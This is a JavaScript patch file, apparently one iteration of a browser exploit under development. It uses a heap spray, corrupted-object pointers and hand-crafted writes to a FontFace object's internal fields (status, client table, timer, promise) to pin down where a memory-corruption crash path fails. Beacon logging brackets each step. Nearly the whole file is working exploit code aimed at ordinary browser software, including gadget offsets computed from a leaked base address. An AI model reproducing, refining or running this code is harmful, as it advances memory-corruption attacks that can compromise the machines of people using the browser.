// V21 Patch: Beacon Bisection - Pinpoint Exact Crash Location
// V20 Arm C crashed - need to find exact crash point in Pending→Failure path

/* ==== V21: BEACON BISECTION ====
 *
 * V20 RESULTS:
 * - Arm A: PASS (layout confirmed)
 * - Arm B: PASS (Success control works)
 * - Arm C: CRASH (Timer repair insufficient)
 *
 * V21 uses beacon bisection to find the EXACT crash location in the
 * Pending→Failure transition path. I'll add beacons at every step:
 *
 * 1. Pre-load validation
 * 2. pump() entry
 * 3. m_sources access
 * 4. setStatus() entry
 * 5. iterateClients() entry
 * 6. Timer operations
 * 7. Status write
 * 8. Post-load
 *
 * By comparing working (Arm B) vs crashing (Arm C) beacon sequences,
 * I'll identify the exact operation that crashes.
 */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V21-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* Query param: mode=success|pending */
      var MODE=(function(){var m=/[?&]mode=(success|pending)/.exec(location.search);return m?m[1]:'pending';})();
      bs('V21-MODE='+MODE);

      /* Save pre-state for witness */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ==== BISECTION POINT 1: PRE-LOAD VALIDATION ==== */
      bs('V21-BP1-PRE-LOAD-VALIDATION');

      /* Validate face object */
      var faceVtable=0n;
      for(var vb=0;vb<8;vb++)faceVtable|=BigInt(hitBuf[vb])<<BigInt(vb*8);
      bs('V21-BP1-face-vtable='+hex(faceVtable));

      var faceBacking=0n;
      for(var bb=0;bb<8;bb++)faceBacking|=BigInt(hitBuf[0x10+bb])<<BigInt(bb*8);
      bs('V21-BP1-face-backing='+hex(faceBacking));

      /* ==== BISECTION POINT 2: CRAFT FACE ==== */
      bs('V21-BP2-CRAFT-START');

      /* Set status based on mode */
      if(MODE==='success'){
        hitBuf[0x82]=3;  /* Success */
        bs('V21-BP2-status=Success');
      }else{
        hitBuf[0x82]=0;  /* Pending */
        bs('V21-BP2-status=Pending');
      }

      /* Empty sources */
      for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;
      bs('V21-BP2-sources=empty');

      /* Client table: original for success, null for pending */
      if(MODE==='success'){
        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
        bs('V21-BP2-clients=original');
      }else{
        for(var i=0;i<8;i++)hitBuf[0x58+i]=0;
        bs('V21-BP2-clients=null');
      }

      /* Override = Block */
      hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      bs('V21-BP2-override=Block');

      /* Timer: zeroed for both modes */
      for(var tz=0x88;tz<=0xBF;tz++)hitBuf[tz]=0;
      bs('V21-BP2-timer=zeroed');

      /* Promise null */
      for(var pb=0;pb<8;pb++)hitBuf[0x18+pb]=0;
      bs('V21-BP2-promise=null');

      /* sourcesPopulated=1 */
      hitBuf[0x83]=1;
      bs('V21-BP2-sourcesPopulated=1');

      /* ==== BISECTION POINT 3: VERIFY FINAL STATE ==== */
      bs('V21-BP3-VERIFY-FINAL');

      bs('V21-BP3-status='+hitBuf[0x82]);
      bs('V21-BP3-sources='+hitBuf.slice(0x28,0x38).map(x=>x.toString(16)).join(','));
      bs('V21-BP3-clients='+hitBuf.slice(0x58,0x60).map(x=>x.toString(16)).join(','));
      bs('V21-BP3-override='+hitBuf[0x87]);
      bs('V21-BP3-timer90='+hitBuf.slice(0x90,0x98).map(x=>x.toString(16)).join(','));
      bs('V21-BP3-timerB0='+hitBuf.slice(0xB0,0xB8).map(x=>x.toString(16)).join(','));

      /* ==== BISECTION POINT 4: PRE-LOAD BEACON ==== */
      bs('V21-BP4-LOAD-PRE');

      /* ==== BISECTION POINT 5: CALL LOAD ==== */
      var loadReturned=false;
      var loadThrew=false;
      var loadError='';

      try{
        faces[zi].load();
        loadReturned=true;
        bs('V21-BP5-LOAD-RETURNED');
      }catch(e){
        loadThrew=true;
        loadError=String(e&&e.message?e.message:'?');
        bs('V21-BP5-LOAD-THREW-'+loadError);
      }

      /* ==== BISECTION POINT 6: POST-LOAD ANALYSIS ==== */
      bs('V21-BP6-POST-LOAD-returned='+loadReturned+'-threw='+loadThrew);

      /* Final status read */
      var finalStatus=hitBuf[0x82];
      bs('V21-BP6-STATUS-AFTER='+finalStatus);

      /* Check JS binding status */
      try{
        var jsStatus=faces[zi].status;
        bs('V21-BP6-JS-STATUS='+jsStatus);
      }catch(e){
        bs('V21-BP6-JS-STATUS-ERROR-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== BISECTION POINT 7: WITNESS CHECK ==== */
      bs('V21-BP7-WITNESS');

      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('V21-BP7-WIT-WRITE-'+diffs.slice(0,8).join('|'));
      else bs('V21-BP7-WIT-nowrite');

      /* ==== BISECTION POINT 8: RESTORE ==== */
      bs('V21-BP8-RESTORE');

      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V21-BP8-RESTORED');

      /* Verdict */
      if(loadReturned){
        verd('ok','V21 '+MODE+' load() SUCCESS');
        bs('V21-DONE-'+MODE+'-SUCCESS');
      }else{
        verd('err','V21 '+MODE+' load() FAILED');
        bs('V21-DONE-'+MODE+'-FAILED');
      }

    }else bs('V21-SKIP-bad-idx');
  }else bs('V21-SKIP-missing-data');
}catch(e21){bs('V21-ERR-'+String(e21&&e21.message?e21.message:'?'));}
/* ==== V21 END ==== */
